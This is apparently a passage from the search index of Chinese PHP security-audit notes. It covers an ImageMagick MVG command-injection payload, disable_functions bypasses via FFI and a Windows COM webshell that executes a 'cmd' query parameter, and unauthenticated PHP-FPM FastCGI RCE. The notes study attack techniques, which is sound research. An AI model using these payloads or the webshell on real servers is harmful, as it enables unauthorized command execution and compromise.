graphic-context viewbox 0 0 640 480 fill 'url(https://\"|mkdir /nmsl; \")' pop graphic-context \u4e0a\u9762\u662fmvg\u7684\u4e00\u79cd\u683c\u5f0f\uff0c\u5176\u4e2d\u5728fill\u5904\u586b\u5165https\u7684url.","title":"RCE"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/DisableFunctions%E7%BB%95%E8%BF%87/DisableFunctions%E7%BB%95%E8%BF%87/#_1","text":"","title":"\u5b9e\u8df5"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/DisableFunctions%E7%BB%95%E8%BF%87/DisableFunctions%E7%BB%95%E8%BF%87/#ffi-rce","text":"\u9002\u7528\u7248\u672c:php>7.4 \u9700\u8981\uff1a FFI support = enable \uff0c\uff08\u5f00\u542fffi) opcache.preload \u542f\u7528. (\u6307\u5b9a\u5c06\u5728\u670d\u52a1\u5668\u542f\u52a8\u65f6\u7f16\u8bd1\u548c\u6267\u884c\u7684PHP\u6587\u4ef6\uff0c\u6587\u4ef6\u4e2d\u5b9a\u4e49\u7684\u6240\u6709\u51fd\u6570\u548c\u5927\u591a\u6570\u7c7b\u90fd\u5c06\u6c38\u4e45\u52a0\u8f7d\u5230 PHP \u7684\u51fd\u6570\u548c\u7c7b\u8868\u4e2d\uff0c\u5e76\u5728\u5c06\u6765\u7684\u4efb\u4f55\u8bf7\u6c42\u7684\u4e0a\u4e0b\u6587\u4e2d\u6c38\u4e45\u53ef\u7528)\u3002 (\u6781\u5927\u62d3\u5bbdffi rce\u653b\u51fb\u9762) ffi\u662fphp>7.4\u65b0\u589e\u7684\u4e00\u4e2a\u4e1c\u897f\uff0c\u7b80\u800c\u8a00\u4e4b\u5c31\u662f\u4e00\u4e2a\u53ef\u4ee5\u5728php\u91cc\u8c03\u7528c\u8bed\u8a00\u4ee3\u7801\u7684\u63a5\u53e3. https://www.php.net/manual/en/ffi.examples-basic.php \u5b98\u65b9\u6587\u6863 \u6211\u4eec\u7684payload\u96cf\u5f62\u4e00\u822c\u662f\u8fd9\u6837 $ffi=FFI::cdef{ \"int system(char *format);\" }; $ffi->system(command); \u627e\u4e2a\u673a\u4f1a\u8ba9\u670d\u52a1\u5668\u8c03\u7528FFI\u5c31\u53ef\u4ee5\u4e86\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u7ed5\u8fc7disable_functions\u4e86\u503c\u5f97\u6ce8\u610f\u7684\u662fsystem\u6ca1\u6709\u56de\u663e","title":"ffi rce"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/DisableFunctions%E7%BB%95%E8%BF%87/DisableFunctions%E7%BB%95%E8%BF%87/#windowscom","text":"\u9700\u6c42: windows\u7cfb\u7edf\uff0c\u4e14system32\u76ee\u5f55\u4e0b\u5b58\u5728wshom.ocx php.ini\u91cccom.allow_dcom=true php.ini\u91ccextension=php_com_dotnet.dll(\u6ca1\u6709\u7684\u8bdd\u81ea\u5df1\u52a0\u4e0a) \u6b63\u786e\u914d\u7f6e\u540e\uff0c\u5728phpinfo\u4e2d\u770b,\u8fd9\u6837\u5c31\u7b97\u914d\u7f6e\u597d\u4e86\u73af\u5883 ban\u6389\u51fd\u6570 .\u8fd9\u79cd\u60c5\u51b5\u6211\u4eec\u6765\u7ed5\u7ed5disable_functions <?php $command = $_GET['cmd']; $wsh = new COM('WScript.shell'); // \u751f\u6210\u4e00\u4e2aCOM\u5bf9\u8c61\u3000Shell.Application\u4e5f\u80fd $exec = $wsh->exec(\"cmd /c\".$command); //\u8c03\u7528\u5bf9\u8c61\u65b9\u6cd5\u6765\u6267\u884c\u547d\u4ee4 $stdout = $exec->StdOut(); $stroutput = $stdout->ReadAll(); echo $stroutput; ?> \u627e\u4e2a\u673a\u4f1a\u628a\u8fd9\u4e2a\u811a\u672c\u4f20\u5230\u670d\u52a1\u5668\u4e0a,\u7136\u540e\u8bbf\u95ee\u5b83\uff0ccmd\u4f20\u547d\u4ee4\u5c31\u53ef\u4ee5\u4e86","title":"\u5229\u7528Windows\u7cfb\u7edf\u7ec4\u4ef6COM\u7ed5\u8fc7"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/FastCgi%E5%8D%8F%E8%AE%AE%26PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E5%AF%BC%E8%87%B4RCE/FastCgi%E5%8D%8F%E8%AE%AE%26PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E5%AF%BC%E8%87%B4RCE/","text":"FastCgi\u534f\u8bae\\&PHP-FPM\u672a\u6388\u6743\u5bfc\u81f4RCE title: FastCgi\u534f\u8bae\\&PHP-FPM\u672a\u6388\u6743\u5bfc\u81f4RCE date: tags: php\u5f00\u53d1\u4e0e\u5b89\u5168 \u53c2\u8003: https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html \u79bb\u522b\u6b4c Fastcgi \u8981\u8bf4PHP-FPM\uff0c\u9996\u5148\u5c31\u8981\u8bf4\u4e00\u4e0bFastcgi\u534f\u8bae. Fastcgi\u5176\u5b9e\u662f\u4e00\u4e2a\u548cHTTP\u672c\u8d28\u4e00\u6837\u7684\u901a\u4fe1\u534f\u8bae\u3002 HTTP\u7528\u4e8e\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u901a\u4fe1,Fastcgi\u7528\u4e8e\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u4e0e\u67d0\u4e2a\u8bed\u8a00\u540e\u7aef\u901a\u4fe1\u3002 Fastcgi\u534f\u8bae\u7531\u591a\u4e2arecord\u7ec4\u6210\uff0crecord\u7531header\u548cbody\u7ec4\u6210\u3002 \u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u5c06body\u548cheader\u6309\u7167fastcgi\u89c4\u5219\u5c01\u88c5\u597d\u53d1\u9001\u7ed9\u8bed\u8a00\u540e\u7aef\uff0c\u540e\u7aef\u89e3\u7801\u540e\u62ff\u5230\u5177\u4f53\u6570\u636e\u8fdb\u884c\u6307\u5b9a\u7684\u64cd\u4f5c\uff0c\u518d\u6309fastcgi\u534f\u8bae\u5c01\u88c5\u53f7\u7ed3\u679c\u8fd4\u56de\u7ed9\u670d\u52a1\u5668 record Header\u56fa\u5b9a8\u4e2a\u5b57\u8282,\u6bcf\u4e2a\u53d8\u91cf\u4e00\u4e2a\u5b57\u8282 Body\u5206\u4e3a\u4e24\u7c7b:\u771f\u6b63\u7684\u5185\u5bb9\u6570\u636e,\u548c\u989d\u5916\u6570\u636e(\u975e\u5fc5\u987b) \u4e00\u4e2afastcgi record\u7ed3\u6784\u6700\u5927\u652f\u63012^16=65536\u5b57\u8282\u7684body typedef struct { /* Header */ unsigned char version; // \u7248\u672c unsigned char type; // \u672c\u6b21record\u7684\u7c7b\u578b unsigned char requestIdB1; // \u672c\u6b21record\u5bf9\u5e94\u7684\u8bf7\u6c42id unsigned char requestIdB0; unsigned char contentLengthB1; // body\u4f53\u7684\u5927\u5c0f unsigned char contentLengthB0; unsigned char paddingLength; // \u989d\u5916\u5757\u5927\u5c0f unsigned char reserved; /* Body */ unsigned char contentData[contentLength]; unsigned char paddingData[paddingLength]; } FCGI_Record; Fastcgi type \u4e5f\u5c31\u662f\u4e00\u4e2arecord\u7684type\u53d8\u91cf\u3002type\u7528\u4e8e\u8868\u660e\u8be5record\u7684\u4f5c\u7528,\u4ee5\u4e0b\u662ftype\u4e3b\u8981\u7684\u4e00\u4e9b\u503c type \u5c31\u662f\u6307\u5b9a\u8be5record\u7684\u4f5c\u7528\u3002\u56e0\u4e3afastcgi\u4e00\u4e2arecord\u7684\u5927\u5c0f\u662f\u6709\u9650\u7684\uff0c\u4f5c\u7528\u4e5f\u662f\u5355\u4e00\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5728\u4e00\u4e2aTCP\u6d41\u91cc\u4f20\u8f93\u591a\u4e2arecord\u3002\u901a\u8fc7 type \u6765\u6807\u5fd7\u6bcf\u4e2arecord\u7684\u4f5c\u7528\uff0c\u7528 requestId \u4f5c\u4e3a\u540c\u4e00\u6b21\u8bf7\u6c42\u7684id\u3002 \u5176\u4e2dtype=4 \u5bf9\u6211\u4eec\u63a5\u4e0b\u6765\u8bb2PHP-FPM\u6709\u91cd\u8981\u4f5c\u7528,\u4ed6\u6709\u56db\u4e2a\u4e0d\u540c\u7684\u7ed3\u6784 typedef struct { unsigned char nameLengthB0; /* nameLengthB0 >> 7 == 0 */ unsigned char valueLengthB0; /* valueLengthB0 >> 7 == 0 */ unsigned char nameData[nameLength]; unsigned char valueData[valueLength]; } FCGI_NameValuePair11; typedef struct { unsigned char nameLengthB0; /* nameLengthB0 >> 7 == 0 */ unsigned char valueLengthB3; /* valueLengthB3 >> 7 == 1 */ unsigned char valueLengthB2; unsigned char valueLengthB1; unsigned char valueLengthB0; unsigned char nameData[nameLength]; unsigned char valueData[valueLength ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0]; } FCGI_NameValuePair14; typedef struct { unsigned char nameLengthB3; /* nameLengthB3 >> 7 == 1 */ unsigned char nameLengthB2; unsigned char nameLengthB1; unsigned char nameLengthB0; unsigned char valueLengthB0; /* valueLengthB0 >> 7 == 0 */ unsigned char nameData[nameLength ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0]; unsigned char valueData[valueLength]; } FCGI_NameValuePair41; typedef struct { unsigned char nameLengthB3; /* nameLengthB3 >> 7 == 1 */ unsigned char nameLengthB2; unsigned char nameLengthB1; unsigned char nameLengthB0; unsigned char valueLengthB3; /* valueLengthB3 >> 7 == 1 */ unsigned char valueLengthB2; unsigned char valueLengthB1; unsigned char valueLengthB0; unsigned char nameData[nameLength ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0]; unsigned char valueData[valueLength ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0]; } FCGI_NameValuePair44; key\u3001value\u5747\u5c0f\u4e8e128\u5b57\u8282\uff0c\u7528 FCGI_NameValuePair11 key\u5927\u4e8e128\u5b57\u8282\uff0cvalue\u5c0f\u4e8e128\u5b57\u8282\uff0c\u7528 FCGI_NameValuePair41 key\u5c0f\u4e8e128\u5b57\u8282\uff0cvalue\u5927\u4e8e128\u5b57\u8282\uff0c\u7528 FCGI_NameValuePair14 key\u3001value\u5747\u5927\u4e8e128\u5b57\u8282\uff0c\u7528 FCGI_NameValuePair44 PHP-FPM FPM\u662fFastcgi\u534f\u8bae\u7684\u89e3\u6790\u5668.\u4e2d\u95f4\u4ef6\u4ee5fastcgi\u534f\u8bae\u628a\u7528\u6237\u4f20\u6765\u7684\u6570\u636e\u5c01\u88c5\u4f20\u7ed9FPM\u3002\u4e0b\u9762\u8fd9\u4e2a\u56fe\u5c31\u662ffastcgi\u534f\u8bae\u7684\u6a21\u6837 \u952e\u503c\u5bf9.\u5373fastcgi\u7684type=4\uff0c\u8fd9\u5c31\u662f\u4e0a\u9762\u4e13\u95e8\u8bf4\u8fd9\u4e2a\u7684\u76ee\u7684. \u5176\u4e2dscript_filename\u53ea\u5411\u8981\u6267\u884c\u7684php\u6587\u4ef6 Nginx(IIS7)\u89e3\u6790\u6f0f\u6d1e\u6df1\u5165 \u4ee5\u524d\u8bb0\u5f55\u8fc7\u8fd9\u4e2a\u4e2d\u95f4\u4ef6\u6f0f\u6d1e\uff0c\u4f46\u6ca1\u6709\u8be6\u7ec6\u7684\u53bb\u4e86\u89e3\u4e3a\u4ec0\u4e48\u3002\u8fd9\u91cc\u5c31\u8bf4\u8bf4 \u5728php fix_pathinfo\u5f00\u542f\u7684\u60c5\u51b5\u4e0b,\u4f20\u5165 url/1.txt/.php\u65f6,1.txt\u4f1a\u88ab\u5f53\u4f5cphp\u6587\u4ef6\u89e3\u6790. \u7a76\u5176\u539f\u56e0\uff0c\u662f\u56e0\u4e3a\u914d\u7f6e\u6587\u4ef6\u4e2d security.limit_extensions\u9ed8\u8ba4\u9650\u5b9a\u4e86.php\u540e\u7f00\u6587\u4ef6\u624d\u4ea4\u7ed9php-fpm\u5904\u7406,\u4f20\u5165\u7ed9fpm\u7684\u6570\u636e\u662f\u7c7b\u4f3c\u8fd9\u6837\u7684 \u6309\u7406\u8bf4\u5e94\u8be5\u62a5\u9519404\u5427\uff0c\u4f46\u662ffix_pathinfo\u4f1a\u5224\u65ad\u8fd9\u4e2aSCRIPT_FILENAME\u662f\u5426\u5b58\u5728\uff0c\u82e5\u4e0d\u5b58\u5728\u5c31\u4f1a\u53bb\u6389\u6700\u540e\u4e00\u4e2a/\u540e\u9762\u7684\u5185\u5bb9\u518d\u6b21\u5224\u65ad\uff0c\u77e5\u9053\u6587\u4ef6\u5b58\u5728\u4e3a\u6b62\uff0c\u518d\u628a\u8be5\u6587\u4ef6\u5f53\u4f5cPHP\u6587\u4ef6\u6267\u884c RCE \u4e0a\u9762\u90a3\u4e2a\u89e3\u6790\u6f0f\u6d1e\u53ea\u662f\u4e2a\u9898\u5916\u8bdd\u3002 \u6211\u4eec\u6765\u8bb2\u8bb2RCE\u3002\u670d\u52a1\u5668\u9ed8\u8ba4PHP-FPM\u7aef\u53e3\u662f9000\uff0c\u5982\u679c\u8fd9\u4e2a\u7aef\u53e3\u66b4\u9732\u5728\u516c\u7f51\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u81ea\u5df1\u6784\u9020fastcgi\u534f\u8bae\u4e0efpm\u901a\u4fe1. \u6b64\u65f6\u6211\u4eec\u5c31\u80fd\u60f3\u51farce\u7684\u96cf\u5f62\uff0c\u63a7\u5236SCRIPT_FILENAME\u53bb\u6267\u884c\u6211\u4eec\u7684shell\uff0c\u53cd\u5f39\u4e2ashell\u4ec0\u4e48\u7684\uff0c\u4f46\u662f\u524d\u63d0\u662f\u6211\u4eec\u5fc5\u987b\u5f97\u4e0a\u4f20\u4e00\u4e2ashell\u4e0a\u53bb\uff0c\u592a\u7b28\u6bd4\uff0c\u4e8e\u662f\u6211\u4eec\u7ee7\u7eed\u601d\u8003. \u4e0a\u9762\u63d0\u5230\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7fastcgi\u534f\u8bae\u4e34\u65f6\u66f4\u6539PHP\u7684\u4e00\u4e9b\u914d\u7f6e\u9879(\u73af\u5883\u53c2\u6570).\u6211\u4eec\u4e0d\u5982\u628a auto_prepend_file \u6216 auto_append_file (\u81ea\u52a8\u5305\u542b\u67d0\u6587\u4ef6) \u8bbe\u7f6e\u4e3aphp\\://input(\u9700allow_url_include=on),\u7136\u540eSCRIPT_FILENAME\u8bbe\u7f6e\u4e3a\u4efb\u610f\u4e00\u4e2a\u670d\u52a1\u5668\u4e0a\u5b58\u5728\u7684PHP\u6587\u4ef6\uff08PHP\u6587\u4ef6\u4e0d\u4ec5\u4ec5\u5728\u670d\u52a1\u5668\u76ee\u5f55\u624d\u4f1a\u6709\uff0cPHP\u7a0b\u5e8f\u76ee\u5f55\u4e0b\u4e5f\u4f1a\u6709PHP\u6587\u4ef6\uff09\uff0c\u5373\u53ef\u901a\u8fc7\u63a7\u5236POST\u7684\u5305\u4f53\u6765\u5b9e\u73b0RCE\u3002\u5c31\u50cf\u8fd9\u6837 exp: https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75","title":"FastCgi\u534f\u8bae\\&PHP-FPM\u672a\u6388\u6743\u5bfc\u81f4RCE"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/FastCgi%E5%8D%8F%E8%AE%AE%26PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E5%AF%BC%E8%87%B4RCE/FastCgi%E5%8D%8F%E8%AE%AE%26PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E5%AF%BC%E8%87%B4RCE/#fastcgiphp-fpmrce","text":"title: FastCgi\u534f\u8bae\\&PHP-FPM\u672a\u6388\u6743\u5bfc\u81f4RCE date: tags: php\u5f00\u53d1\u4e0e\u5b89\u5168 \u53c2\u8003: https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html \u79bb\u522b\u6b4c","title":"FastCgi\u534f\u8bae\\&amp;PHP-FPM\u672a\u6388\u6743\u5bfc\u81f4RCE"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/FastCgi%E5%8D%8F%E8%AE%AE%26PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E5%AF%BC%E8%87%B4RCE/FastCgi%E5%8D%8F%E8%AE%AE%26PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E5%AF%BC%E8%87%B4RCE/#fastcgi","text":"\u8981\u8bf4PHP-FPM\uff0c\u9996\u5148\u5c31\u8981\u8bf4\u4e00\u4e0bFastcgi\u534f\u8bae. Fastcgi\u5176\u5b9e\u662f\u4e00\u4e2a\u548cHTTP\u672c\u8d28\u4e00\u6837\u7684\u901a\u4fe1\u534f\u8bae\u3002 HTTP\u7528\u4e8e\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u901a\u4fe1,Fastcgi\u7528\u4e8e\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u4e0e\u67d0\u4e2a\u8bed\u8a00\u540e\u7aef\u901a\u4fe1\u3002 Fastcgi\u534f\u8bae\u7531\u591a\u4e2arecord\u7ec4\u6210\uff0crecord\u7531header\u548cbody\u7ec4\u6210\u3002 \u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u5c06body\u548cheader\u6309\u7167fastcgi\u89c4\u5219\u5c01\u88c5\u597d\u53d1\u9001\u7ed9\u8bed\u8a00\u540e\u7aef\uff0c\u540e\u7aef\u89e3\u7801\u540e\u62ff\u5230\u5177\u4f53\u6570\u636e\u8fdb\u884c\u6307\u5b9a\u7684\u64cd\u4f5c\uff0c\u518d\u6309fastcgi\u534f\u8bae\u5c01\u88c5\u53f7\u7ed3\u679c\u8fd4\u56de\u7ed9\u670d\u52a1\u5668 record Header\u56fa\u5b9a8\u4e2a\u5b57\u8282,\u6bcf\u4e2a\u53d8\u91cf\u4e00\u4e2a\u5b57\u8282 Body\u5206\u4e3a\u4e24\u7c7b:\u771f\u6b63\u7684\u5185\u5bb9\u6570\u636e,\u548c\u989d\u5916\u6570\u636e(\u975e\u5fc5\u987b) \u4e00\u4e2afastcgi record\u7ed3\u6784\u6700\u5927\u652f\u63012^16=65536\u5b57\u8282\u7684body typedef struct { /* Header */ unsigned char version; // \u7248\u672c unsigned char type; // \u672c\u6b21record\u7684\u7c7b\u578b unsigned char requestIdB1; // \u672c\u6b21record\u5bf9\u5e94\u7684\u8bf7\u6c42id unsigned char requestIdB0; unsigned char contentLengthB1; // body\u4f53\u7684\u5927\u5c0f unsigned char contentLengthB0; unsigned char paddingLength; // \u989d\u5916\u5757\u5927\u5c0f unsigned char reserved; /* Body */ unsigned char contentData[contentLength]; unsigned char paddingData[paddingLength]; } FCGI_Record;","title":"Fastcgi"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/FastCgi%E5%8D%8F%E8%AE%AE%26PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E5%AF%BC%E8%87%B4RCE/FastCgi%E5%8D%8F%E8%AE%AE%26PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E5%AF%BC%E8%87%B4RCE/#fastcgi-type","text":"\u4e5f\u5c31\u662f\u4e00\u4e2arecord\u7684type\u53d8\u91cf\u3002type\u7528\u4e8e\u8868\u660e\u8be5record\u7684\u4f5c\u7528,\u4ee5\u4e0b\u662ftype\u4e3b\u8981\u7684\u4e00\u4e9b\u503c type \u5c31\u662f\u6307\u5b9a\u8be5record\u7684\u4f5c\u7528\u3002\u56e0\u4e3afastcgi\u4e00\u4e2arecord\u7684\u5927\u5c0f\u662f\u6709\u9650\u7684\uff0c\u4f5c\u7528\u4e5f\u662f\u5355\u4e00\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5728\u4e00\u4e2aTCP\u6d41\u91cc\u4f20\u8f93\u591a\u4e2arecord\u3002\u901a\u8fc7 type \u6765\u6807\u5fd7\u6bcf\u4e2arecord\u7684\u4f5c\u7528\uff0c\u7528 requestId \u4f5c\u4e3a\u540c\u4e00\u6b21\u8bf7\u6c42\u7684id\u3002 \u5176\u4e2dtype=4 \u5bf9\u6211\u4eec\u63a5\u4e0b\u6765\u8bb2PHP-FPM\u6709\u91cd\u8981\u4f5c\u7528,\u4ed6\u6709\u56db\u4e2a\u4e0d\u540c\u7684\u7ed3\u6784 typedef struct { unsigned char nameLengthB0; /* nameLengthB0 >> 7 == 0 */ unsigned char valueLengthB0; /* valueLengthB0 >> 7 == 0 */ unsigned char nameData[nameLength]; unsigned char valueData[valueLength]; } FCGI_NameValuePair11; typedef struct { unsigned char nameLengthB0; /* nameLengthB0 >> 7 == 0 */ unsigned char valueLengthB3; /* valueLengthB3 >> 7 == 1 */ unsigned char valueLengthB2; unsigned char valueLengthB1; unsigned char valueLengthB0; unsigned char nameData[nameLength]; unsigned char valueData[valueLength ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0]; } FCGI_NameValuePair14; typedef struct { unsigned char nameLengthB3; /* nameLengthB3 >> 7 == 1 */ unsigned char nameLengthB2; unsigned char nameLengthB1; unsigned char nameLengthB0; unsigned char valueLengthB0; /* valueLengthB0 >> 7 == 0 */ unsigned char nameData[nameLength ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0]; unsigned char valueData[valueLength]; } FCGI_NameValuePair41; typedef struct { unsigned char nameLengthB3; /* nameLengthB3 >> 7 == 1 */ unsigned char nameLengthB2; unsigned char nameLengthB1; unsigned char nameLengthB0; unsigned char valueLengthB3; /* valueLengthB3 >> 7 == 1 */ unsigned char valueLengthB2; unsigned char valueLengthB1; unsigned char valueLengthB0; unsigned char nameData[nameLength ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0]; unsigned char valueData[valueLength ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0]; } FCGI_NameValuePair44; key\u3001value\u5747\u5c0f\u4e8e128\u5b57\u8282\uff0c\u7528 FCGI_NameValuePair11 key\u5927\u4e8e128\u5b57\u8282\uff0cvalue\u5c0f\u4e8e128\u5b57\u8282\uff0c\u7528 FCGI_NameValuePair41 key\u5c0f\u4e8e128\u5b57\u8282\uff0cvalue\u5927\u4e8e128\u5b57\u8282\uff0c\u7528 FCGI_NameValuePair14 key\u3001value\u5747\u5927\u4e8e128\u5b57\u8282\uff0c\u7528 FCGI_NameValuePair44","title":"Fastcgi type"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/FastCgi%E5%8D%8F%E8%AE%AE%26PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E5%AF%BC%E8%87%B4RCE/FastCgi%E5%8D%8F%E8%AE%AE%26PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E5%AF%BC%E8%87%B4RCE/#php-fpm","text":"FPM\u662fFastcgi\u534f\u8bae\u7684\u89e3\u6790\u5668.\u4e2d\u95f4\u4ef6\u4ee5fastcgi\u534f\u8bae\u628a\u7528\u6237\u4f20\u6765\u7684\u6570\u636e\u5c01\u88c5\u4f20\u7ed9FPM\u3002\u4e0b\u9762\u8fd9\u4e2a\u56fe\u5c31\u662ffastcgi\u534f\u8bae\u7684\u6a21\u6837 \u952e\u503c\u5bf9.\u5373fastcgi\u7684type=4\uff0c\u8fd9\u5c31\u662f\u4e0a\u9762\u4e13\u95e8\u8bf4\u8fd9\u4e2a\u7684\u76ee\u7684. \u5176\u4e2dscript_filename\u53ea\u5411\u8981\u6267\u884c\u7684php\u6587\u4ef6","title":"PHP-FPM"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/FastCgi%E5%8D%8F%E8%AE%AE%26PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E5%AF%BC%E8%87%B4RCE/FastCgi%E5%8D%8F%E8%AE%AE%26PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E5%AF%BC%E8%87%B4RCE/#nginxiis7","text":"\u4ee5\u524d\u8bb0\u5f55\u8fc7\u8fd9\u4e2a\u4e2d\u95f4\u4ef6\u6f0f\u6d1e\uff0c\u4f46\u6ca1\u6709\u8be6\u7ec6\u7684\u53bb\u4e86\u89e3\u4e3a\u4ec0\u4e48\u3002\u8fd9\u91cc\u5c31\u8bf4\u8bf4 \u5728php fix_pathinfo\u5f00\u542f\u7684\u60c5\u51b5\u4e0b,\u4f20\u5165 url/1.txt/.php\u65f6,1.txt\u4f1a\u88ab\u5f53\u4f5cphp\u6587\u4ef6\u89e3\u6790. \u7a76\u5176\u539f\u56e0\uff0c\u662f\u56e0\u4e3a\u914d\u7f6e\u6587\u4ef6\u4e2d security.limit_extensions\u9ed8\u8ba4\u9650\u5b9a\u4e86.php\u540e\u7f00\u6587\u4ef6\u624d\u4ea4\u7ed9php-fpm\u5904\u7406,\u4f20\u5165\u7ed9fpm\u7684\u6570\u636e\u662f\u7c7b\u4f3c\u8fd9\u6837\u7684 \u6309\u7406\u8bf4\u5e94\u8be5\u62a5\u9519404\u5427\uff0c\u4f46\u662ffix_pathinfo\u4f1a\u5224\u65ad\u8fd9\u4e2aSCRIPT_FILENAME\u662f\u5426\u5b58\u5728\uff0c\u82e5\u4e0d\u5b58\u5728\u5c31\u4f1a\u53bb\u6389\u6700\u540e\u4e00\u4e2a/\u540e\u9762\u7684\u5185\u5bb9\u518d\u6b21\u5224\u65ad\uff0c\u77e5\u9053\u6587\u4ef6\u5b58\u5728\u4e3a\u6b62\uff0c\u518d\u628a\u8be5\u6587\u4ef6\u5f53\u4f5cPHP\u6587\u4ef6\u6267\u884c","title":"Nginx(IIS7)\u89e3\u6790\u6f0f\u6d1e\u6df1\u5165"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/FastCgi%E5%8D%8F%E8%AE%AE%26PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E5%AF%BC%E8%87%B4RCE/FastCgi%E5%8D%8F%E8%AE%AE%26PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E5%AF%BC%E8%87%B4RCE/#rce","text":"\u4e0a\u9762\u90a3\u4e2a\u89e3\u6790\u6f0f\u6d1e\u53ea\u662f\u4e2a\u9898\u5916\u8bdd\u3002 \u6211\u4eec\u6765\u8bb2\u8bb2RCE\u3002\u670d\u52a1\u5668\u9ed8\u8ba4PHP-FPM\u7aef\u53e3\u662f9000\uff0c\u5982\u679c\u8fd9\u4e2a\u7aef\u53e3\u66b4\u9732\u5728\u516c\u7f51\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u81ea\u5df1\u6784\u9020fastcgi\u534f\u8bae\u4e0efpm\u901a\u4fe1. \u6b64\u65f6\u6211\u4eec\u5c31\u80fd\u60f3\u51farce\u7684\u96cf\u5f62\uff0c\u63a7\u5236SCRIPT_FILENAME\u53bb\u6267\u884c\u6211\u4eec\u7684shell\uff0c\u53cd\u5f39\u4e2ashell\u4ec0\u4e48\u7684\uff0c\u4f46\u662f\u524d\u63d0\u662f\u6211\u4eec\u5fc5\u987b\u5f97\u4e0a\u4f20\u4e00\u4e2ashell\u4e0a\u53bb\uff0c\u592a\u7b28\u6bd4\uff0c\u4e8e\u662f\u6211\u4eec\u7ee7\u7eed\u601d\u8003. \u4e0a\u9762\u63d0\u5230\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7fastcgi\u534f\u8bae\u4e34\u65f6\u66f4\u6539PHP\u7684\u4e00\u4e9b\u914d\u7f6e\u9879(\u73af\u5883\u53c2\u6570).\u6211\u4eec\u4e0d\u5982\u628a auto_prepend_file \u6216 auto_append_file (\u81ea\u52a8\u5305\u542b\u67d0\u6587\u4ef6) \u8bbe\u7f6e\u4e3aphp\\://input(\u9700allow_url_include=on),\u7136\u540eSCRIPT_FILENAME\u8bbe\u7f6e\u4e3a\u4efb\u610f\u4e00\u4e2a\u670d\u52a1\u5668\u4e0a\u5b58\u5728\u7684PHP\u6587\u4ef6\uff08PHP\u6587\u4ef6\u4e0d\u4ec5\u4ec5\u5728\u670d\u52a1\u5668\u76ee\u5f55\u624d\u4f1a\u6709\uff0cPHP\u7a0b\u5e8f\u76ee\u5f55\u4e0b\u4e5f\u4f1a\u6709PHP\u6587\u4ef6\uff09\uff0c\u5373\u53ef\u901a\u8fc7\u63a7\u5236POST\u7684\u5305\u4f53\u6765\u5b9e\u73b0RCE\u3002\u5c31\u50cf\u8fd9\u6837 exp: https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75","title":"RCE"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","text":"PHP\u53cd\u5e8f\u5217\u5316 title: php\u53cd\u5e8f\u5217\u5316 date: tags: php\u5f00\u53d1\u4e0e\u5b89\u5168 php\u53cd\u5e8f\u5217\u5316\u57fa\u7840 \u57fa\u7840\uff1a \u9b54\u672f\u65b9\u6cd5 construct(): \u5f53\u672c\u5bf9\u8c61\u88ab\u521b\u5efa\u7684\u65f6\u5019\u81ea\u52a8\u8c03\u7528\uff0c\uff08unserialize()\u65f6\u4e0d\u4f1a\u88ab\u81ea\u52a8\u8c03\u7528\uff09 wakeup(): 